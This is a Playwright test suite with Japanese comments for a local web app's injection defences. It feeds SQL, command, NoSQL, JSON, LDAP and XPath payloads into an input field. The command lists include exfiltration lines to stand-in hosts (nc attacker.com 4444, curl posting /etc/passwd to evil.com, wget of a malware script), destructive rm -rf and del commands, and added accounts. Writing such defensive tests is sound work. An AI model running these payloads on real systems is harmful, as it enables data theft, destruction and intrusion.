/**
 * インジェクション攻撃防御テスト - TEST-014-02
 * 
 * Sprint 5: エラーハンドリングテスト実装
 * 作成日: 2025-08-17
 * 対象: SQLインジェクション、コマンドインジェクション防御機能
 * 
 * テスト項目:
 * 1. SQLインジェクション文字列の検出と無効化
 * 2. コマンドインジェクション防御
 * 3. NoSQLインジェクション防御
 * 4. JSONインジェクション防御
 * 5. LDAPインジェクション防御
 * 6. XPathインジェクション防御
 */

const { test, expect } = require('@playwright/test');

test.describe('インジェクション攻撃防御テスト', () => {
    test.beforeEach(async ({ page }) => {
        await page.goto('http://localhost:8086');
        await page.waitForLoadState('networkidle');
        await page.waitForFunction(() => window.errorBoundary !== undefined);
    });

    test('SQLインジェクション攻撃パターンの検出と防御', async ({ page }) => {
        const sqlInjectionPatterns = [
            // 基本的なSQLインジェクション
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT * FROM users--",
            
            // 高度なSQLインジェクション
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
            "'; UPDATE users SET password='hacked' WHERE id=1; --",
            "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
            
            // ブラインドSQLインジェクション
            "' AND (SELECT COUNT(*) FROM users) > 0--",
            "' AND ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))>65--",
            
            // エラーベースSQLインジェクション
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            "' AND (SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            
            // 時間ベースSQLインジェクション
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND IF(1=1, SLEEP(5), 0)--",
            
            // NoSQLインジェクション（MongoDB）
            "'; return true; var dummy='",
            '$where: function() { return true; }',
            '{"$ne": null}',
            '{"$regex": ".*"}',
            
            // 二次SQLインジェクション
            "admin'; UPDATE users SET email='hacker@evil.com' WHERE username='admin'--"
        ];

        for (const injection of sqlInjectionPatterns) {
            console.log(`Testing SQL injection: ${injection.substring(0, 50)}...`);
            
            // 日本語とSQLインジェクションコードを組み合わせた入力
            const maliciousInput = `ユーザー${injection}がデータベースにアクセス`;
            
            await page.fill('[data-testid="japanese-input"], #japanese-input, textarea', maliciousInput);
            await page.waitForTimeout(300);
            
            // SQLインジェクションがサニタイズされているか確認
            const outputContent = await page.textContent('[data-testid="plantuml-output"], #plantuml-code, .plantuml-output').catch(() => '');
            
            // 危険なSQL構文がそのまま出力されていないことを確認
            const dangerousPatterns = ['DROP TABLE', 'INSERT INTO', 'UPDATE ', 'DELETE FROM', 'UNION SELECT', 'OR 1=1', 'WAITFOR DELAY'];
            const containsDangerousSQL = dangerousPatterns.some(pattern => 
                outputContent.toUpperCase().includes(pattern.toUpperCase())
            );
            expect(containsDangerousSQL).toBe(false);
            
            // セキュリティログに記録されているか確認
            const securityStats = await page.evaluate(() => {
                return window.errorBoundary ? window.errorBoundary.getEnhancedErrorStats() : {};
            });
            
            // SQLインジェクションが検出されている場合、適切にログ記録されているか
            console.log(`SQL injection test - Security incidents: ${securityStats.security?.securityIncidentCount || 0}`);
        }
    });

    test('コマンドインジェクション防御テスト', async ({ page }) => {
        const commandInjectionPatterns = [
            // Unix/Linux コマンドインジェクション
            '; cat /etc/passwd',
            '&& rm -rf /',
            '| nc attacker.com 4444',
            '`whoami`',
            '$(uname -a)',
            '; curl http://evil.com/steal-data',
            
            // Windows コマンドインジェクション
            '& dir C:\\',
            '&& del /f /s /q C:\\*.*',
            '| type C:\\Windows\\System32\\drivers\\etc\\hosts',
            '& net user hacker password123 /add',
            
            // PowerShell インジェクション
            '; Invoke-Expression "whoami"',
            '& powershell.exe -Command "Get-Process"',
            
            // ファイルシステム操作
            '; touch /tmp/hacked',
            '&& mkdir /tmp/backdoor',
            '| echo "hacked" > /tmp/proof.txt',
            
            // ネットワーク操作
            '; wget http://evil.com/malware.sh',
            '&& curl -X POST -d @/etc/passwd http://evil.com/collect'
        ];

        for (const injection of commandInjectionPatterns) {
            const maliciousInput = `システム${injection}を実行`;
            
            await page.fill('[data-testid="japanese-input"], #japanese-input, textarea', maliciousInput);
            await page.waitForTimeout(300);
            
            // コマンドインジェクションがサニタイズされているか確認
            const outputContent = await page.textContent('[data-testid="plantuml-output"], #plantuml-code, .plantuml-output').catch(() => '');
            
            // 危険なコマンド文字がエスケープまたは除去されているか確認
            const dangerousChars = [';', '&&', '||', '|', '`', '$', '&'];
            const containsDangerousChars = dangerousChars.some(char => outputContent.includes(char));
            
            // コンテキストによっては一部の文字は許可される場合があるため、
            // より具体的な危険なコマンドパターンをチェック
            const dangerousCommands = ['rm -rf', 'del /f', 'cat /etc', 'net user', 'whoami', 'curl', 'wget'];
            const containsDangerousCommands = dangerousCommands.some(cmd => 
                outputContent.toLowerCase().includes(cmd.toLowerCase())
            );
            expect(containsDangerousCommands).toBe(false);
            
            console.log(`Command injection test: ${injection.substring(0, 30)}... - Sanitized: ${!containsDangerousCommands}`);
        }
    });

    test('NoSQLインジェクション防御テスト', async ({ page }) => {
        const nosqlInjectionPatterns = [
            // MongoDB インジェクション
            '{"$ne": null}',
            '{"$regex": ".*"}',
            '{"$where": "this.username == this.password"}',
            '{"$gt": ""}',
            '{"$nin": []}',
            '{"$exists": true}',
            
            // JavaScript関数インジェクション
            'function() { return true; }',
            'function() { db.users.drop(); }',
            'function() { return this.username == "admin"; }',
            
            // 正規表現インジェクション
            '.*',
            '^admin',
            '(?=.*admin)(?=.*password)',
            
            // 配列インジェクション
            '["admin", "root", "administrator"]',
            '[{"$ne": null}]',
            
            // 演算子インジェクション
            '{"username": {"$ne": "1"}, "password": {"$ne": "1"}}',
            '{"$or": [{"username": "admin"}, {"role": "admin"}]}'
        ];

        for (const injection of nosqlInjectionPatterns) {
            const maliciousInput = `データベース検索: ${injection}`;
            
            await page.fill('[data-testid="japanese-input"], #japanese-input, textarea', maliciousInput);
            await page.waitForTimeout(200);
            
            const outputContent = await page.textContent('[data-testid="plantuml-output"], #plantuml-code, .plantuml-output').catch(() => '');
            
            // NoSQL演算子がエスケープされているか確認
            const nosqlOperators = ['$ne', '$regex', '$where', '$gt', '$nin', '$exists', '$or', '$and'];
            const containsNosqlOperators = nosqlOperators.some(op => outputContent.includes(op));
            
            // 関数定義が除去されているか確認
            const containsFunction = outputContent.includes('function()') || outputContent.includes('return ');
            expect(containsFunction).toBe(false);
            
            console.log(`NoSQL injection test: ${injection.substring(0, 40)}... - Function removed: ${!containsFunction}`);
        }
    });

    test('JSONインジェクション防御テスト', async ({ page }) => {
        const jsonInjectionPatterns = [
            // JSON構造破壊
            '", "admin": true, "fake": "',
            '"}]; DELETE FROM users; {"fake": "',
            '", "role": "admin"}//remainder',
            
            // JSON関数インジェクション
            '", "callback": "alert(document.cookie)", "fake": "',
            '", "eval": "require(\\"child_process\\").exec(\\"rm -rf /\\")", "x": "',
            
            // JSONP インジェクション
            'callback({"admin": true});',
            ');alert("XSS");//',
            
            // Unicode エスケープ
            '\\u0022, \\u0022admin\\u0022: true, \\u0022fake\\u0022: \\u0022',
            
            // 数値・真偽値インジェクション
            '0, "admin": true, "fake": 0',
            'false, "role": "admin", "fake": true'
        ];

        for (const injection of jsonInjectionPatterns) {
            const maliciousInput = `JSON設定: {"user": "${injection}"}`;
            
            await page.fill('[data-testid="japanese-input"], #japanese-input, textarea', maliciousInput);
            await page.waitForTimeout(200);
            
            const outputContent = await page.textContent('[data-testid="plantuml-output"], #plantuml-code, .plantuml-output').catch(() => '');
            
            // JSON構造を破壊する文字がエスケープされているか確認
            const jsonBreakers = ['", "', '"}]', '}//'];
            const containsJsonBreakers = jsonBreakers.some(breaker => outputContent.includes(breaker));
            
            // 危険なプロパティが追加されていないか確認
            const dangerousProps = ['admin": true', 'role": "admin"', 'callback":', 'eval":'];
            const containsDangerousProps = dangerousProps.some(prop => outputContent.includes(prop));
            expect(containsDangerousProps).toBe(false);
            
            console.log(`JSON injection test: ${injection.substring(0, 30)}... - Props secured: ${!containsDangerousProps}`);
        }
    });

    test('LDAPインジェクション防御テスト', async ({ page }) => {
        const ldapInjectionPatterns = [
            // 基本的なLDAPインジェクション
            'admin)(&',
            'admin)(|',
            '*)(&(objectClass=*)',
            '*)((objectClass=*)(password=*))',
            
            // LDAP演算子インジェクション
            ')|(&(directory=users)(|(uid=*',
            '*)|(cn=*',
            '*)(&(objectClass=person)(cn=*',
            
            // ワイルドカード攻撃
            '*',
            'a*',
            '*admin*',
            '?????',
            
            // 属性値操作
            'uid=admin)(&(password=*',
            'cn=*)(mail=*@company.com',
            
            // エスケープバイパス
            'admin\\29\\28\\26',
            'user\\2A'
        ];

        for (const injection of ldapInjectionPatterns) {
            const maliciousInput = `LDAP検索: (uid=${injection})`;
            
            await page.fill('[data-testid="japanese-input"], #japanese-input, textarea', maliciousInput);
            await page.waitForTimeout(200);
            
            const outputContent = await page.textContent('[data-testid="plantuml-output"], #plantuml-code, .plantuml-output').catch(() => '');
            
            // LDAP特殊文字がエスケープされているか確認
            const ldapSpecialChars = ['(&', ')|', '*)'];
            const containsLdapChars = ldapSpecialChars.some(chars => outputContent.includes(chars));
            
            // ワイルドカードが適切に処理されているか確認
            const wildcardPattern = /\*(?![a-zA-Z0-9\u3040-\u309F\u30A0-\u30FF\u4E00-\u9FAF])/;
            const containsWildcard = wildcardPattern.test(outputContent);
            
            console.log(`LDAP injection test: ${injection.substring(0, 20)}... - Special chars escaped: ${!containsLdapChars}`);
        }
    });

    test('XPathインジェクション防御テスト', async ({ page }) => {
        const xpathInjectionPatterns = [
            // 基本的なXPathインジェクション
            "' or '1'='1",
            "'] | //user[name='admin' and password='admin'] | //user['",
            "'] | //password | //user['",
            
            // XPath関数インジェクション
            "' or count(//user)>0 and '1'='1",
            "' or substring(//user[1]/password,1,1)='a' and '1'='1",
            "' or string-length(//user[1]/password)>5 and '1'='1",
            
            // ブラインドXPathインジェクション
            "' and substring(//user[1]/name,1,1)='a",
            "' and count(//user[position()=1])=1 and 'a'='a",
            
            // 軸操作
            "/..//user",
            "/following-sibling::user",
            "/preceding-sibling::password",
            
            // 論理演算子
            "'] | //user | //admin['",
            "' and //user[1] and '1'='1",
            "' or //admin or '1'='1"
        ];

        for (const injection of xpathInjectionPatterns) {
            const maliciousInput = `XML検索: //user[name='${injection}']`;
            
            await page.fill('[data-testid="japanese-input"], #japanese-input, textarea', maliciousInput);
            await page.waitForTimeout(200);
            
            const outputContent = await page.textContent('[data-testid="plantuml-output"], #plantuml-code, .plantuml-output').catch(() => '');
            
            // XPath演算子がエスケープされているか確認
            const xpathOperators = [' or ', ' and ', '//user', '//admin', '//password'];
            const containsXpathOps = xpathOperators.some(op => outputContent.includes(op));
            
            // XPath関数が無害化されているか確認
            const xpathFunctions = ['count(', 'substring(', 'string-length(', 'position()'];
            const containsXpathFuncs = xpathFunctions.some(func => outputContent.includes(func));
            expect(containsXpathFuncs).toBe(false);
            
            console.log(`XPath injection test: ${injection.substring(0, 30)}... - Functions removed: ${!containsXpathFuncs}`);
        }
    });

    test('混合インジェクション攻撃の包括的防御', async ({ page }) => {
        const mixedInjectionAttacks = [
            // SQL + XSS
            "'; DROP TABLE users; --<script>alert('XSS')</script>",
            
            // Command + JSON
            '"; rm -rf /; {"admin": true, "fake": "',
            
            // LDAP + XPath
            "admin)(&(uid=*'] | //user['",
            
            // NoSQL + Command
            '{"$where": "function() { require(\\"child_process\\").exec(\\"rm -rf /\\"); }"}',
            
            // 多層エンコード
            "%27%20%4F%52%20%27%31%27%3D%27%31", // ' OR '1'='1'
            
            // Unicode + SQL
            "\\u0027 OR \\u0031=\\u0031--",
            
            // Base64 + Command
            "'; echo 'Y3VybCBodHRwOi8vZXZpbC5jb20=' | base64 -d | sh; --"
        ];

        for (const attack of mixedInjectionAttacks) {
            const maliciousInput = `複合攻撃テスト: ${attack}`;
            
            await page.fill('[data-testid="japanese-input"], #japanese-input, textarea', maliciousInput);
            await page.waitForTimeout(500);
            
            const outputContent = await page.textContent('[data-testid="plantuml-output"], #plantuml-code, .plantuml-output').catch(() => '');
            
            // 各種インジェクションパターンがすべて防御されているか確認
            const dangerousPatterns = [
                'DROP TABLE', 'rm -rf', 'alert(', '{"admin":', '//user', 'function()', 'base64 -d'
            ];
            
            const containsDangerousPattern = dangerousPatterns.some(pattern => 
                outputContent.includes(pattern)
            );
            expect(containsDangerousPattern).toBe(false);
            
            // セキュリティインシデントが適切に記録されているか確認
            const securityStats = await page.evaluate(() => {
                return window.errorBoundary ? window.errorBoundary.getEnhancedErrorStats() : {};
            });
            
            console.log(`Mixed injection attack defended. Security incidents: ${securityStats.security?.securityIncidentCount || 0}`);
        }
    });

    test('インジェクション防御のパフォーマンステスト', async ({ page }) => {
        const largePayloads = [
            // 大きなSQLインジェクション
            "'; " + "UNION SELECT ".repeat(100) + "* FROM users; --",
            
            // 大きなコマンドインジェクション
            "; " + "echo 'test' && ".repeat(100) + "ls",
            
            // 大きなJSONインジェクション
            '", ' + '"key": "value", '.repeat(100) + '"fake": "'
        ];

        for (const payload of largePayloads) {
            const startTime = Date.now();
            
            await page.fill('[data-testid="japanese-input"], #japanese-input, textarea', payload);
            await page.waitForTimeout(100);
            
            const endTime = Date.now();
            const processingTime = endTime - startTime;
            
            // 大きなペイロードでも迅速に処理されることを確認（5秒以内）
            expect(processingTime).toBeLessThan(5000);
            
            // サニタイゼーションが適切に実行されていることを確認
            const outputContent = await page.textContent('[data-testid="plantuml-output"], #plantuml-code, .plantuml-output').catch(() => '');
            const isClean = !outputContent.includes('UNION SELECT') && 
                           !outputContent.includes('echo ') && 
                           !outputContent.includes('"key": "value"');
            expect(isClean).toBe(true);
            
            console.log(`Large payload processing time: ${processingTime}ms - Clean: ${isClean}`);
        }
    });
});